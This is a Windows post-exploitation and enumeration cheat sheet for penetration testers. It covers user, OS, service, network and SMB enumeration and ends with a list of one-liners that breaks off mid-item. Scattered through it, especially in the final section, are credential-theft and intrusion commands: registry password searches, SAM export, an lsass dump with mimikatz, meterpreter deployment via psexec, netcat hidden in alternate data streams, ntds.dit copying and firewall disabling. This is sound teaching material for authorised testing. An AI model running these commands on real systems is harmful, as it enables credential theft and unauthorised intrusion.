# Enumeration

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here. &#x20;
{% endhint %}

{% hint style="info" %}
Be aware sometimes these commands require elevated privileges to be run, or may be blocked by GPO or other means ([JEA](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview) for example).

Most commands that run in cmd.exe will also run in PowerShell! This gives many more options and provides flexibility at times. Some commands may not work directly though, and will need to be run through cmd.exe by prefixing the commands with **`cmd /c`**
{% endhint %}

[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) = My favorite Windows enumeration script, automates most common enumeration methods.

## User Enumeration

### Get user information:

{% tabs %}
{% tab title="PowerShell" %}
`$env:username` Displays the current user's display name

`Get-LocalUser | Select *` Display usernames, password and account expiration, SID, Description, enabled status

#### Groups

`[Security.Principal.WindowsIdentity]::GetCurrent()` Not very good output by default, need to manipulate the object a bit to get the desired information

The below example is better.  Will display group name and SIDs.  Still not the same as `whoami /all` though.

```powershell
$tableLayout = @{Expression={((New-Object System.Security.Principal.SecurityIdentifier($_.Value)).Translate([System.Security.Principal.NTAccount])).Value};Label=”Group Name”},
@{Expression={$_.Value};Label=”Group SID”},
@{Expression={$_.Type};Label=”Group Type”}

([Security.Principal.WindowsIdentity]::GetCurrent()).Claims | Format-Table $tableLayout -AutoSize
```

#### List users' home folders

```powershell
Get-ChildItem 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\ProfileList' | ForEach-Object { $_.GetValue('ProfileImagePath') }
```

#### Using WMI

Use either `Get-WmiObject` or `Get-CimInstance` to pull information about all local accounts.  This can also be used remotely, and to query information about AD accounts.

```powershell
Get-CimInstance -ComputerName $env:computername -Class Win32_UserAccount -Filter "LocalAccount=True" | Select PSComputername, Name, Status, Disabled, AccountType, Lockout, PasswordRequired, PasswordChangeable | Out-GridView

#Get Current or last logged in username
$CurrentUser = Get-CimInstance -ComputerName $Computer -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName
```

`Get-WmiObject` has been deprecated.  Only use it if `Get-CimInstance` is not available due to outdated PowerShell version or problems with Windows Remoting.  In most cases the two command names should be replaceable with no issues.

#### Using ADSI

```powershell
$adsi = [ADSI]"WinNT://$env:computername"
$Users = $adsi.Children | where {$_.SchemaClassName -eq 'user'}
$Users | Select *
```

Can be run on remote machines by substituting `$env:computername` with the computer name of the remote machine. This returns a large amount of useful information on all users.&#x20;

{% hint style="info" %}
There is a property called Password, though this did not return anything on my Microsoft Account-enabled machine. Will have to try this on a domain or local account.
{% endhint %}
{% endtab %}

{% tab title="cmd.exe" %}
`whoami /all` Includes: Username, SID, Groups (including their descriptions!), and user privileges.&#x20;

`echo %username%` Displays the current username

`net user $username` Displays account and password expiration information, Logon script, User profile, Home directory, and group membership
{% endtab %}
{% endtabs %}

### Get list of users

{% tabs %}
{% tab title="PowerShell" %}
```powershell
Get-CimInstance -class Win32_UserAccount
```

Gets display name, description, lockout status, password requirements, login name and domain, and SID.

If run on a domain connected machine dumps all accounts on the whole domain! On a non-domain joined machine lists all local users.  Includes Service Accounts. &#x20;
{% endtab %}

{% tab title="cmd.exe" %}
### Local machine Users & Groups Enumeration

```
#Show current user name
net user %username%

#show all local users
net users

#Show all local groups
net localgroup 

#Show who is inside Administrators group 
net localgroup Administrators 
```

### Active Directory Users & Groups Enumeration

```
net user /domain
net group /domain
```
{% endtab %}
{% endtabs %}

### Using WMI Query Language (WQL)

WQL is an entire subject on its own.  If you want to know the full extent of the capabilities of this powerful query language, type `Get-Help WQL` in a PowerShell prompt.  Below are a few examples of queries to pull lists of users from both local machines and from the domain.

```powershell
# The following WQL query returns only local user accounts.
$q = "Select * from Win32_UserAccount where LocalAccount = True"
Get-CimInstance -Query $q

# To find domain accounts, use a value of False, as shown in the following example.
$q = "Select * from Win32_UserAccount where LocalAccount = False"
Get-CimInstance -Query $q
```

{% hint style="info" %}
WQL uses the backslash (`\`) as its escape character. This is different from Windows PowerShell, which uses the backtick character (`` ` ``).
{% endhint %}

### LAPS

LAPS allows you to manage the local Administrator password (which is randomized, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorized users using ACLs. Passwords are protected in transit from the client to the server using Kerberos v5 and AES.&#x20;

```
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
```

When using LAPS, two new attributes appear in the computer objects of the domain: `ms-msc-AdmPwd` and `ms-mcs-AdmPwdExpirationTime`. These attributes contains the plain-text admin password and the expiration time.  In a domain environment, it could be interesting to check which users can read these attributes.

### Find Administrator Accounts

TODO: Add more examples

Many administrators set their account passwords to never expire, so searching for these can be valuable.  Also, this means the password may have been set a long time ago.

```bash
Search-ADAccount -PasswordNeverExpires
```

### Find AutoLogon passwords

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>null | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

### Search for "password" in registry

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## OS Information

### Get OS Version information

{% tabs %}
{% tab title="PowerShell" %}
```powershell
[System.Environment]::OSVersion
```
{% endtab %}

{% tab title="cmd.exe" %}
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
{% endtab %}
{% endtabs %}

### Get basic Windows information

{% tabs %}
{% tab title="PowerShell" %}
`Get-ComputerInfo` Gives a ton of information about the current hardware and Windows configuration
{% endtab %}

{% tab title="cmd.exe" %}
`systeminfo`

Gives basic hardware information, Also lists the hotfixes that have been installed. &#x20;
{% endtab %}
{% endtabs %}

### Get installed patches

{% tabs %}
{% tab title="PowerShell" %}
```powershell
Get-CimInstance -query 'select * from win32_quickfixengineering' | foreach $_.hotfixid {Get-Hotfix}
```

Use the `-description "Security update"` attribute of `Get-Hotfix` to list only security updates
{% endtab %}

{% tab title="cmd.exe" %}
`wmic qfe get Caption,Description,HotFixID,InstalledOn`
{% endtab %}
{% endtabs %}

### Drivers

#### Get a list of installed drivers

{% tabs %}
{% tab title="PowerShell" %}
**Requires an elevated PowerShell prompt:**

```powershell
 Get-WindowsDriver -Online -All
```

Specifies that the action is to be taken on the operating system that is currently running on the local computer.
{% endtab %}

{% tab title="cmd.exe" %}
`driverquery`
{% endtab %}
{% endtabs %}

#### Default log path

`$env:windir\Logs\Dism\dism.log`

#### Make back up of all installed drivers

```powershell
Export-WindowsDriver -Online -Destination "C:\Backup\Path\"
```

### List Environment Variables

{% tabs %}
{% tab title="PowerShell" %}
Show all current environment variables: `Get-ChildItem Env:`

_Also aliased to_: `dir env:` or `ls env:` or `gci env:`
{% endtab %}

{% tab title="cmd.exe" %}
Show all current environment variables: `set`&#x20;
{% endtab %}
{% endtabs %}

### Check Audit (logging) Settings

These settings show what is being logged, this can be useful information for evasion and persistence&#x20;

{% tabs %}
{% tab title="PowerShell" %}
```powershell
Get-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

Add the `-Name $KeyName` property to get the value of a specific key.
{% endtab %}

{% tab title="cmd.exe" %}
`reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit`
{% endtab %}
{% endtabs %}

#### Windows Event Forwarding

Check where the logs are sent:

{% tabs %}
{% tab title="PowerShell" %}
```powershell
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

Add the `-Name $KeyName` property to get the value of a specific key.
{% endtab %}

{% tab title="cmd.exe" %}
`reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager`
{% endtab %}
{% endtabs %}

### AV

Check if there is any antivirus installed:&#x20;

{% tabs %}
{% tab title="PowerShell" %}


```bash
function Get-AntivirusName { 
[cmdletBinding()]     
param ( 
[string]$ComputerName = "$env:computername" , 
$Credential 
) 
    BEGIN  
        { 
            $wmiQuery = "SELECT * FROM AntiVirusProduct" 
        } 
    PROCESS  
        {    
            $AntivirusProduct = Get-CimInstance -Namespace "root\SecurityCenter2" -Query $wmiQuery @psboundparameters         
            [array]$AntivirusNames = $AntivirusProduct.displayName    
               
            foreach ($av in $AntivirusNames) 
            {
            echo "The installed AV products are:"
            echo $av
            }
         }
} 

Get-AntivirusName
```
{% endtab %}

{% tab title="cmd.exe" %}
`WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get DisplayName`
{% endtab %}
{% endtabs %}

### Windows Firewall

Check the status of the Windows Firewall

{% tabs %}
{% tab title="PowerShell" %}
```powershell
Get-NetFirewallProfile -All
```

Use the  `-Name Public` property (instead of `-All`) to select a specific firewall profile.  Pipe the results to `| Get-NetFirewallRule` to see the currently configured rules.
{% endtab %}

{% tab title="cmd.exe" %}


```bash
sc query windefend 

netsh advfirewall firewall dump
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all

netsh firewall show state
netsh firewall show config

# Disable firewall
netsh firewall set opmode disable
```
{% endtab %}
{% endtabs %}

### Clipboard

Get the contents of the clipboard&#x20;

`Get-Clipboard`

## Software, Services, and Processes

### Software

#### List the installed software

{% tabs %}
{% tab title="PowerShell" %}
```powershell
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' 
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE
```

The below PowerShell script will return a more complete list of all software installed by querying `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall` on a list of computer names.  It displays the following information:&#x20;

* Computer Name,&#x20;
* Software Name,&#x20;
* Version,&#x20;
* Publisher

```powershell
function Get-SoftwareInventory
{
  #Enable -Verbose output, piping of input from other comdlets, and more
  [CmdletBinding()]
  #List of input parameters
  Param
  (   
    #List of ComputerNames to process
    [Parameter(ValueFromPipeline=$true,
    ValueFromPipelineByPropertyName=$true)]
    [ValidateNotNullOrEmpty()]
    [alias('Name')] #Allows for piping in of computers by name from Active Directory (Get-ADComputer)
    [string[]]
    $ComputerName
  )

  Begin
  {
    $SoftwareArray = @()
  }

  Process
  {
    #Variable to hold the location of Currently Installed Programs
    $SoftwareRegKey = ”SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall” 

    #Create an instance of the Registry Object and open the HKLM base key
    $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey(‘LocalMachine’,$ComputerName) 

    #Open the Uninstall subkey using the OpenSubKey Method
    $RegKey = $Reg.OpenSubKey($SoftwareRegKey) 

    #Create a string array containing all the subkey names
    [String[]]$SubKeys = $RegKey.GetSubKeyNames() 

    #Open each Subkey and use its GetValue method to return the required values
    foreach($key in $SubKeys)
    {
        $UninstallKey = $SoftwareRegKey + ”\\” + $key 
        $UninstallSubKey = $reg.OpenSubKey($UninstallKey) 
        $obj = [PSCustomObject]@{
                Computer_Name = $ComputerName
                DisplayName = $($UninstallSubKey.GetValue(“DisplayName”))
                DisplayVersion = $($UninstallSubKey.GetValue(“DisplayVersion”))
                InstallLocation = $($UninstallSubKey.GetValue(“InstallLocation”))
                Publisher = $($UninstallSubKey.GetValue(“Publisher”))
        }
        $SoftwareArray += $obj
    } 
  }
  End
  {
    $SoftwareArray | Where-Object { $_.DisplayName } | Select-Object ComputerName, DisplayName, DisplayVersion, Publisher | Format-Table -AutoSize
  }
}
Get-SoftwareInventory
```
{% endtab %}

{% tab title="cmd.exe" %}
`dir /a "C:\Program Files"`&#x20;

`dir /a "C:\Program Files (x86)"`&#x20;

`reg query HKEY_LOCAL_MACHINE\SOFTWARE`

#### WMIC

```
wmic product get name /value
```
{% endtab %}
{% endtabs %}



### Uninstall Software <a href="#cfde" id="cfde"></a>

```powershell
wmic product where name="$name" call uninstall /INTERACTIVE:OFF
```

### Services

{% tabs %}
{% tab title="PowerShell" %}
Get a list of services:&#x20;

`Get-Service`
{% endtab %}

{% tab title="cmd.exe" %}
Get a list of services:&#x20;

`net start`&#x20;

`wmic service list brief`&#x20;

`sc query`
{% endtab %}
{% endtabs %}

#### Get detailed information for a specific service

`sc qc $service_name`&#x20;

{% hint style="success" %}
To use this command in PowerShell you need to specify `sc.exe` instead of `sc`. In PowerShell `sc` is an alias for `Set-Content` and will not give the expected output.
{% endhint %}

#### Enable a disabled service

If you are having this error (for example with SSDPSRV):

> System error 1058 has occurred. The service cannot be started, either because it is disabled or because it has no enabled devices associated with it. You can enable it using:
>
> ```
> sc config SSDPSRV start= demand
> sc config SSDPSRV obj= ".\LocalSystem" password= ""
> ```
>
> Note: In Windows XP SP1, the service upnphost depends on SSDPSRV to work

#### Enable a disabled service

If you are having this error (for example with SSDPSRV):

> System error 1058 has occurred. The service cannot be started, either because it is disabled or because it has no enabled devices associated with it. You can enable it using:
>
> ```
> sc config SSDPSRV start= demand
> sc config SSDPSRV obj= ".\LocalSystem" password= ""
> ```
>
> Note: In Windows XP SP1, the service upnphost depends on SSDPSRV to work

### Get running processes

{% tabs %}
{% tab title="PowerShell" %}
`Get-Process`

With usernames of process owner&#x20;

```powershell
Get-CimInstance -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
```

\*Admin rights needed to pull owner information

Without usernames&#x20;

```powershell
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
{% endtab %}

{% tab title="cmd.exe" %}
`tasklist` list running processes

| **`tasklist`** Options | Use                                               |
| ---------------------- | ------------------------------------------------- |
| `/svc`                 | List all the service information for each process |
| `/fo $format`          | Change output format \[table is default]          |
| `/s $ComputerName`     | Run on remote computer \[Computer Name or IP]\\   |
| `/u $username`         | Username if credentials are needed                |
| `/p $password`         | Password if credentials are needed                |
| `/v`                   | Verbose output                                    |
{% endtab %}
{% endtabs %}

#### Check permissions of the process binaries

```
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
    for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
        icacls "%%z" 
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
    )
)
```

#### Check permissions of the folders of the process binaries (useful for dll injection)

```
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v 
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
    icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users 
todos %username%" && echo.
)
```

### Get current network connections

{% tabs %}
{% tab title="PowerShell" %}
### View TCP port connections with PowerShell

`Get-NetTCPConnection`

{% hint style="warning" %}
`This cmdlet is for TCP connections ONLY! UDP information must be queried separately. See`` `**`Get-NetUDPEndpoint` ** `below.`
{% endhint %}

Get listening connections:

```
Get-NetTCPConnection | ? {$_.State -eq "Listen"}
```

Check for anything that’s listening from any remote address:

```
Get-NetTCPConnection | ? {($_.State -eq "Listen") -and ($_.RemoteAddress -eq "0.0.0.0")}
```

To get connection information for a specific port use the `-LocalPort $port` attribute.

Since this cmdlet returns objects, you can use these objects to return other information, such as getting the process ID associated with each connection:

```
$processes = (Get-NetTCPConnection | ? {($_.State -eq "Listen") -and ($_.RemoteAddress -eq "0.0.0.0")}).OwningProcess

foreach ($process in $processes) {Get-Process -PID $process | select ID,ProcessName}
```

### View UDP port connections with PowerShell

```
Get-NetUDPEndpoint | Select-Object -Property LocalAddress,LocalPort,OwningProcess |ft 
```

To show listening ports filter for the address 0.0.0.0:

```
Get-NetUDPEndpoint | Where {$_.LocalAddress -eq "0.0.0.0"}
```

Use the `-CimSession $CimSession` Parameter to run this on a remote computer.
{% endtab %}

{% tab title="cmd.exe" %}
`netstat -ano`
{% endtab %}
{% endtabs %}

### PowerShell netstat implementation

Shows TCP and UDP connections, with the following properties: Local Address, Local Port, Remote Address, Remote Port, Connection State, Process Name, and PID

TODO: Make this fully PowerShell implemented, without netstat

```
function Get-NetworkStatistics 
    { 
        $properties = ‘Protocol’,’LocalAddress’,’LocalPort’ 
        $properties += ‘RemoteAddress’,’RemotePort’,’State’,’ProcessName’,’PID’

        netstat -ano | Select-String -Pattern ‘\s+(TCP|UDP)’ | ForEach-Object {

            $item = $_.line.split(” “,[System.StringSplitOptions]::RemoveEmptyEntries)

            if($item[1] -notmatch ‘^\[::’) 
            {            
                if (($la = $item[1] -as [ipaddress]).AddressFamily -eq ‘InterNetworkV6’) 
                { 
                   $localAddress = $la.IPAddressToString 
                   $localPort = $item[1].split(‘\]:’)[-1] 
                } 
                else 
                { 
                    $localAddress = $item[1].split(‘:’)[0] 
                    $localPort = $item[1].split(‘:’)[-1] 
                } 

                if (($ra = $item[2] -as [ipaddress]).AddressFamily -eq ‘InterNetworkV6’) 
                { 
                   $remoteAddress = $ra.IPAddressToString 
                   $remotePort = $item[2].split(‘\]:’)[-1] 
                } 
                else 
                { 
                   $remoteAddress = $item[2].split(‘:’)[0] 
                   $remotePort = $item[2].split(‘:’)[-1] 
                } 

                New-Object PSObject -Property @{ 
                    PID = $item[-1] 
                    ProcessName = (Get-Process -Id $item[-1] -ErrorAction SilentlyContinue).Name 
                    Protocol = $item[0] 
                    LocalAddress = $localAddress 
                    LocalPort = $localPort 
                    RemoteAddress =$remoteAddress 
                    RemotePort = $remotePort 
                    State = if($item[0] -eq ‘tcp’) {$item[3]} else {$null} 
                } | Select-Object -Property $properties 
            } 
        } 
    }

    Get-NetworkStatistics | Format-Table
```

UDP info for updating above script (this example only shows connections for port 1900)

```
$LOCALPORT = "1900"
$CONNECTIONS = Get-NetUDPEndpoint |Select-Object -Property LocalPort, @{name='ProcessID';expression={(Get-Process -Id $_.OwningProcess). ID}}, @{name='ProcessName';expression={(Get-Process -Id $_.OwningProcess). Path}}
Foreach ($I in $CONNECTIONS)
{
If ($I.LocalPort -eq $LOCALPORT)
{
$I
}
}
```

[https://github.com/carlospolop/hacktricks/blob/master/windows/basic-cmd-for-pentesters.md#network](https://github.com/carlospolop/hacktricks/blob/master/windows/basic-cmd-for-pentesters.md#network) (TODO:check for more network enumeration info here)

### AutoRuns

Check which files are executed when the computer is started. Components that are executed when a user logins can be exploited to execute malicious code when the administrator logins. (cmd.exe)

{% tabs %}
{% tab title="PowerShell" %}


```
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
{% endtab %}

{% tab title="cmd.exe" %}


```
wmic startup get caption,command 2>nul & ^
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run 2>nul & ^
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce 2>nul & ^
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run 2>nul & ^
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce 2>nul & ^
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul & ^
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul & ^
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul & ^
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
```
{% endtab %}
{% endtabs %}

#### SysInternals AutoRuns

For a comprehensive list of auto-executed files you can use AutoRuns from SysInternals&#x20;

* [https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)

To run this from a command prompt without popup windows:

`autorunsc.exe -m -nobanner -a * -ct /accepteula`

## SMB

Port 139 and 445- SMB/Samba. Server Message Block is a service that enables the user to share files with other machines. Works the same as a command line FTP client, may browse files without even having credentials

### SMB Enumeration Checklist

* Enumerate Hostname&#x20;
  * &#x20;`nmblookup -A $ip`
* List Shares
  * `smbmap -H $computer`
  * `echo exit | smbclient -L \\\\$ip`
  * `nmap --script smb-enum-shares -p 139,445 $ip`
* Check Null Sessions
  * `smbmap -H $computer`
  * `rpcclient -U "" -N $ip`
  * `smbclient \\\\$ip\\$share_name`
* Check for Vulnerabilities&#x20;
  * `nmap --script smb-vuln* -p 139,445 $ip`
* Overall Scan &#x20;
  * `enum4linux -a $ip`
* Manual Inspection
  * `smbver.sh $ip $port`&#x20;
  * Use Wireshark to check pcap

### Share List:

```bash
smbclient --list $ip
smbclient -L $ip
smbmap -H $computer
```

### Check SMB vulnerabilities:

```bash
nmap --script=smb-check-vulns.nse $ip -p 445
```

### SMB nmap scripts to enumerate shares and OS discovery

```bash
nmap -p 139,445 $ip_range --script smb-enum-shares.nse smb-os-discovery.nse
```

### Connect using Username

```bash
smbclient -L $ip -U $UserName -p 445
```

### Connect to Shares

```bash
smbclient \\\\$ip\\$ShareName
smbclient \\\\$ip\\$ShareName -U $UserName
```

### Enumerate with smb-shares

```bash
enum4linux -a $ip
```

`-a` "do everything" option

### Get machine name and then enumerate with smbclient

```bash
nmblookup -A $ip
smbclient -L $server_name -I $ip
```

### rpcclient

#### Connect with a null-session

```bash
rpcclient -U $UserName $ip
rpcclient -U "" $ip
#press enter if it asks for a password
```

#### Common Checks

```
rpcclient $> srvinfo
rpcclient $> enumdomusers
rpcclient $> enumalsgroups domain
rpcclient $> lookupnames administrators
rpcclient> querydominfo
rpcclient> enumdomusers
rpcclient> queryuser john
```

### scan for vulnerabilities with nmap

```bash
nmap --script smb-vuln* -p 139,445 $ip
```

### Use TCPdump/Wireshark to get version

_`@rewardone`_ in the PWK forums posted a script to gather Samba versions:

```bash
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
sleep 0.5 && echo ""
```

To get Windows SMB information open the pcap in Wireshark and filter on `ntlmssp.ntlmv2_response`

## [madhuakula](https://github.com/madhuakula)/[**wincmdfu**](https://github.com/madhuakula/wincmdfu)

* TODO: Everything below from the above site...in the process of verification, cleanup, and assimilation.

## Windows CLI gems. Tweets of [@wincmdfu](https://www.twitter.com/wincmdfu)

Windows one line commands that make life easier, shortcuts and command line fu.

#### Get entries from IPv4 neighbor cache

```
C:\>netsh interface ipv4 show neighbors
```

#### Get available wireless networks via cmd and netsh

```
C:\>netsh wlan show networks mode=b
```

#### Quick list IP addresses only

Save the following in `ip.bat` in `%PATH%`

```
C:\>ipconfig | find /I "pv"
```

Call `ip` from CLI

#### List ALL services AND their binaries

```
for /F "tokens=2* delims= " %i in ('sc query ^| find /I "ce_name"') do @sc qc %i %j
```

#### Export SAM from the Windows Registry to a file

```
C:\>reg save HKLM\SAM "%temp%\SAM.reg"
```

#### Enable remote desktop using reg

```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

#### Enable the boot log to see list of drivers loaded during startup

```
bcdedit /set bootlog yes
```

Read via `%windir%\ntbtlog.txt`

#### Powershell cmdlet to create System Restore Point

```
PS C:\>Checkpoint-Computer -description "Restore point!"
```

#### Check the current account for seDebugPrivilege

```
C:\> whoami /priv | findstr "Debug"
```

For all privs:

```
C:\> whoami /priv
```

#### Enable/disable system users via command line

```
C:\>net user test /active:yes (no)
```

Get full help on the net user command:

```
C:\>net help user
```

#### View process that is consuming the most memory using powershell

```
PS C:\> (Get-Process | Sort-Object -Descending WS)[0]
```

#### Create an Alternate Data Stream from a file on an NTFS partition

```
C:\>type data.txt > C:\windows\explorer.exe:newads.txt
```

#### Export running processes in CSV format

```
C:\> tasklist /FO CSV > tasks.txt
```

#### Lock Windows desktop using command line

```
C:\> rundll32 user32.dll,LockWorkStation
```

#### Start explorer with a file or folder selected/highlighted

```
C:\> explorer /select,C:\MyData\sample.docx
```

#### Dump VirtualBox image containing RAM and ELF headers

```
C:\>vboxmanage debugvm "WinXPLab1" dumpguestcore --filename winxplab1.elf
```

#### Set Time Zone of the system clock

```
C:\> tzutil /s "Eastern Standard Time"
```

List available Time zones:

```
C:\> tzutil /l
```

#### Make folder inside a guest from the host

**VirtualBox**

```
C:\> vboxmanage guestcontrol "WinXP" md "C:\\test" --username "user" --password "pass"
```

#### Force copy meterpreter binary to remote machines & run as system

```
C:\> psexec @$ips.txt -s -u adminuser -p pass -f -c \exploits\mp.exe
```

#### Create n/w share called `Apps`, with read access & limit to 10 conns

```
C:\> net share Apps=C:\Apps /G:everyone,READ /US:10
```

#### List all the drives under My Computer using fsutil

```
C:\> fsutil.exe fsinfo drives
```

#### Troubleshoot n/w packet drops with router statistics using pathping

```
C:\> pathping -n www.google.com
```

#### List unsigned dlls for a specific process.

**For system wide list, remove the process name**

```
C:\> listdlls -u explorer.exe
```

#### Obtain a list of Windows XP computers on the domain using PS

**Server2008**

```
PS C:\> Get-ADComputer -filter {OperatingSystem -like "*XP*"}
```

#### Open the System Properties window, with the `Advanced` tab selected

**Change the number for different tabs**

```
C:\> control sysdm.cpl,,3
```

#### Using the `dir` command to find Alternate Data Streams

```
C:\> dir /R | find ":$D"
```

Using streams `sysinternals` (shows path):

```
C:\> streams -s .
```

#### Use `procdump` to obtain the `lsass` process memory.

**Use `mimikatz`  `minidump` to get passwords**

```
C:\> procdump -accepteula -ma lsass.exe mini.dmp
```

#### Run `mimikatz` in `minidump` mode & use `mini.dmp` from `procdump`

```
mimikatz # sekurlsa::minidump mini.dmp
mimikatz # sekurlsa::logonPasswords
```

#### Get list of startup programs using wmic

```
C:\> wmic startup list full
```

#### Add a binary to an Alternate Data Stream

```
C:\> type c:\tools\nc.exe > c:\nice.png:nc.exe
```

Execute it (XP/2K3):

```
C:\> start c:\nice.png:nc.exe
```

#### Execute a binary Alternate Data Stream Win 7/2008 using wmic

```
C:\> wmic process call create C:\nice.png:nc.exe
```

#### Show config & state info for Network Access Protection enabled client

[https://technet.microsoft.com/en-us/library/cc730902(v=ws.10).aspx](https://technet.microsoft.com/en-us/library/cc730902\(v=ws.10\).aspx)

```
C:\> netsh nap client show configuration
```

#### Get computer system information, including domain name and memory, using wmic

```
C:\> wmic computersystem list /format:csv
```

#### Use the Package Manager in Windows to install the Telnet client on Windows Vista & higher

```
C:\> pkgmgr /iu:"TelnetClient"
```

#### Secure delete a file/folder in Windows

**Sysinternals**

```
C:\> sdelete -p 10 a.txt
```

To recursively delete folders:

```
C:\> sdelete -10 -r C:\data\
```

#### Show all startup entries while hiding Microsoft entries. CSV output

**It covers more locations than Windows inbuilt tools**

```
C:\> autorunsc -m -c
```

#### Download files via commandline using PS

```
PS C:\> ipmo BitsTransfer;Start-BitsTransfer -Source http://foo/nc.exe -Destination C:\Windows\Temp\
```

#### Fetch the last 10 entries from the Windows Security event log, in text format

```
C:\> wevtutil qe Security /c:10 /f:Text
```

**def is XML**

#### Create a dll that runs calc on invoke

```
msfpayload windows/exec cmd=calc.exe R | msfencode -t dll -o rcalc.dll

C:\> rundll32.exe rcalc.dll,1
```

#### Run a command as another user

**You will be prompted for password**

```
C:\> runas /noprofile /user:domain\username "mmc wf.msc"
```

#### Get shutdown/reboot events from the last 1000 log entries using PS

```
Get-EventLog -log system -n 1000 | Where {$_.eventid -eq '1074'} | fl -pr *
```

#### Create a new snapshot of the volume that has the AD database and log files

```
C:\> ntdsutil sn "ac i ntds" create quit quit
```

#### Mount the snapshot

**Copy ntds.dit from snapshot & System hive from reg for pwd hashes**

```
C:\> ntdsutil snapshot "list all" "mount 1" quit quit
```

#### Run a process on a remote system using wmic

```
C:\> wmic /node:ip process call create "net user dum dum /add"
```

#### List the machines, with usernames, that were connected via RDP

```
C:\> reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s
```

#### List all process that are running on your system by remote users connected via RDP

```
C:\> query process *
```

#### Reset the Windows TCP\IP stack

```
netsh int ip reset c:\tcpresetlog.txt
```

#### List logged on users.

**Very useful during a pentest to look for domain admins**

```
C:\> net session | find "\\"
```

#### Set a static IP on a remote box

```
C:\> wmic /node:remotebox nicconfig where Index=1 call EnableStatic ("192.168.1.4"), ("255.255.255.0")
```

#### Bypass powershell execution policy restrictions

```
PS C:\> powershell -ExecutionPolicy Bypass -Noninteractive -File .\lastboot.ps1
```

#### List running processes every second on a remote box

```
C:\> wmic /node:target process list brief /every:1
```

**Remove `/node:target` for localhost**

#### Get a list of running processes and their command line arguments on a remote system

```
C:\> wmic /node:target process get commandline, name
```

#### Remotely enable and start the Volume Shadow Copy Service

```
C:\> sc \\target config vss start= auto
C:\> sc \\target start vss
```

#### Ping multiple IPs from `ips.txt` & see live hosts

```
